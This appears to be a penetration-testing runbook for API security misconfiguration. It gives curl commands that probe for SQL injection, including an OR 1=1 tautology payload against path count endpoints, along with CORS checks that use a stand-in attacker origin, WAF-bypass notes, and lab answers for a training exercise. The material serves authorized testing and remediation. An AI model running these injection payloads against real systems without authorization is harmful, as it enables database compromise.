# Batch 08 — Security Misconfiguration (operator)

## FILL IN (any API)

```bash
BASE="https://api.example.com"
EMAIL="user@example.com"; PASS="..."
LOGIN="/api/v1/authentication/.../sign-in"
# From OAS: search, count, filter, sort, report — any string into query/path
COUNT_PATH="/api/v1/.../{Name}/count"
# Optional second account for header baselines
```

## GOAL
Find **wrong defaults / missing hardening / unsafe composition of user input into powerful subsystems** (SQL, LDAP, OS, serializers, CORS, debug, cloud IAM) — not a single “authz class,” but a **hygiene + injection surface** pass.

## TIME
1–2 hours (deeper SQLi/export can run longer)

## YOU NEED
- OpenAPI + one authenticated role  
- curl; sqlmap only on **authorized** targets with rules of engagement  
- Browser or curl for `Origin` / preflight  

---

## WHY (first principles)

**Security Misconfiguration** (OWASP API8 / classic A05) is: the system is running with **settings, frameworks, or plumbing that were never hardened** — or user input is wired into a powerful interpreter **without a safe API**.

| Bucket | Examples |
|--------|----------|
| **Injection plumbing** | String-built SQL/LDAP/OS/NoSQL; template injection |
| **Transport / browser policy** | Wildcard CORS, missing HSTS, weak cookies |
| **Surface left on** | Debug, stack traces, default admin, open actuator, Swagger in prod without auth |
| **Cloud / host** | Public buckets, overly open security groups, metadata reachable via SSRF |
| **Crypto / session** | Default JWT secret, alg none accepted (also Broken Auth) |

**SQLi is often taught under “Injection,”** but Academy places CWE-89 under misconfiguration when the **misconfig is “we concatenated user input into SQL.”** Operator report:  
- **Primary:** SQL Injection (CWE-89)  
- **Root cause class:** insecure query construction / missing parameterized API  

**CORS `Access-Control-Allow-Origin: *`** is a pure misconfiguration of the **HTTP security policy** — any origin can read responses in a browser context (worse if credentials/cookies; still bad for bearer-in-JS apps when combined with XSS or malicious pages that trick users to paste tokens).

---

## PART A — Identify injection sinks (SQL and friends)

### A1) Where do strings enter queries?

| Pattern | Why risky |
|---------|-----------|
| Path `/resource/{Name}/count` | Name often concatenated into `LIKE '%Name%'` |
| `?filter=`, `?sort=`, `?q=` | Dynamic ORDER BY / WHERE |
| GraphQL arguments into ORM raw | |
| Export / report builders | Multi-clause SQL |

### A2) Probe with syntax, not payload soup first

```bash
JWT=$(curl -sk -X POST "$BASE$LOGIN" -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$EMAIL\",\"Password\":\"$PASS\"}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["jwt"])')

# Baseline
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/products/laptop/count"

# Break the query
curl -sk -H "Authorization: Bearer $JWT" \
  "$BASE/api/v1/products/laptop'/count"
# URL-encode: laptop%27
```

| Response | Hypothesis |
|----------|------------|
| 500 / “An error has occurred” after `'` | Likely SQLi / parser break |
| Same count as baseline | Filtered or parameterized |
| Different error for `"` vs `'` | Fingerprint DB/driver |

### A3) Boolean / tautology (authorized only)

```bash
# Path segment must be encoded
enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"laptop' OR 1=1 --\", safe=''))")
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/products/${enc}/count"
# productsCount jumps to full table size → tautology works
```

### A4) Confirm impact beyond count

Only if RoE allows: UNION, error-based extract, stacked queries, time-based.  
Minimum professional proof: **error on quote + controllable count with OR 1=1**.

### A5) Operator log

```text
Endpoint:
Parameter location (path/query/json):
Baseline count:
Broken quote behavior:
Tautology count:
DB family guess:
```

---

## PART B — HTTP security headers & CORS

### B1) Baseline response headers

```bash
curl -sk -D - -o /dev/null "$BASE/api/v1/health-or-any" | head -40
```

Check for: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options` / `frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`, `Cache-Control` on sensitive responses.

### B2) CORS with attacker Origin

```bash
curl -sk -D - -o /dev/null \
  -H "Origin: https://evil.example" \
  -H "Authorization: Bearer $JWT" \
  "$BASE/api/v1/..."
```

| ACAO | Meaning |
|------|---------|
| `*` | Any site can read response (no credentialed CORS cookies; still bad for many SPAs) |
| reflects `evil.example` + `ACAC: true` | Credentialed cross-origin — high impact |
| absent / strict allowlist | Better |

### B3) Preflight (if browser-critical)

```bash
curl -sk -D - -o /dev/null -X OPTIONS \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: authorization,content-type" \
  "$BASE/api/v1/..."
```

### B4) Operator log

```text
Access-Control-Allow-Origin:
Access-Control-Allow-Credentials:
Missing security headers:
Impact narrative:
```

---

## PART C — Other misconfig checks (beyond this lab)

| Check | How |
|-------|-----|
| Stack traces / debug | Force 500; look for paths, SQL, versions |
| Default creds / test users | Only in scope |
| Swagger / OpenAPI unauthenticated in prod | Document exposure |
| Verbose `Server` / `X-Powered-By` | Low; still recon |
| Directory listing / static defaults | |
| Insecure deserialization endpoints | Separate deep dive |
| HTTP methods TRACE / unnecessary verbs | |
| JWT alg / default secret | Batch 02 + JWT skill |
| Verbose rate-limit absence on expensive ops | Batch 04 |

---

## EDGE CASES

| # | Test | Class |
|---|------|--------|
| E1 | `'` / `"` / `\` in path vs query | SQLi |
| E2 | `OR 1=1` vs `OR 1=2` count delta | Boolean |
| E3 | Comment styles `--` `-- -` `#` `/**/` | DB family |
| E4 | `ORDER BY` injection via sort param | SQLi |
| E5 | JSON body field into raw SQL | API SQLi |
| E6 | Second-order SQLi (store then count) | |
| E7 | WAF: encode, case, comment split | Bypass |
| E8 | CORS `*` + Authorization header from browser | Misconfig impact |
| E9 | Null origin / `Origin: null` | |
| E10 | Missing HSTS on HTTPS API | Headers |
| E11 | Error message parity (user enum) | Misconfig / auth |
| E12 | GraphQL introspection on in prod | Surface |

---

## GOTCHAS

| # | Gotcha | What to do |
|---|--------|------------|
| G1 | Forgetting URL-encode `'` in path | Use `urllib.parse.quote` |
| G2 | Calling count change “not SQLi” because no data dump | Tautology + error is enough for severity with impact text |
| G3 | sqlmap without scope | Never on unauthorized hosts |
| G4 | `Access-Control-Allow-Origin: *` alone ≠ always CSRF | Explain browser model; pair with cookie design |
| G5 | Confusing BOLA with SQLi | SQLi is interpreter; BOLA is authz |
| G6 | Full table count drifts (lab data changes) | Report the number returned under tautology payload |
| G7 | Only testing products endpoint | Mirror role on suppliers/customers count |

---

## Evidence comments (paste)

**SQLi**

```text
Class: SQL Injection (CWE-89) under Security Misconfiguration (API8).
Endpoint E interpolates user parameter P into SQL.
Evidence: baseline count C1; quote → error; tautology payload → count C2 (full table).
Impact: integrity/confidentiality of DB; possible RCE via stacked/xp_ depending on engine.
Fix: parameterized queries / ORM; never concatenate.
```

**CORS**

```text
Class: Security Misconfiguration — permissive CORS.
Response includes Access-Control-Allow-Origin: * [on API that returns sensitive JSON].
Impact: malicious origin can read API responses from a victim browser context
when requests are issuable (e.g. token in JS, or reflected auth design).
Fix: explicit origin allowlist; never * with credentials.
```

## Prevention

| Area | Control |
|------|---------|
| SQL | Parameters, ORM, least-privilege DB user, WAF as defense-in-depth |
| Input | Allowlist length/charset for path segments |
| CORS | Explicit origins; no `*` on authenticated APIs |
| Headers | OWASP Secure Headers baseline |
| Errors | Generic client errors; detail only in logs |
| Prod surface | No debug, lock down OpenAPI, disable unused verbs |

## IF / THEN

| See | Do |
|-----|-----|
| Quote → 500/error, tautology → full count | SQLi finding + table size |
| ACAO `*` | Header misconfig finding |
| Stack trace with SQL text | Misconfig + helps SQLi |
| Also missing authz on same endpoint | Separate BFLA |

## NEXT
→ Improper Inventory Management (shadow/old API versions)  
→ SSRF batch if internal DB host reachable  

---

## WORKED EXAMPLE (lab only — not the runbook)

Inlanefreight. Full proof: `../notes/inlanefreight-security-misconfig/`.

| Q | Account | Action | Answer |
|---|---------|--------|--------|
| Demo | p12 | `products/{Name}/count` SQLi → full product count | ~722 under OR 1=1 |
| **Q1** | p13 | `suppliers/{Name}/count` + `test' OR 1=1 --` | **151** |
| **Q2** | any | Response header | **`Access-Control-Allow-Origin: *`** |
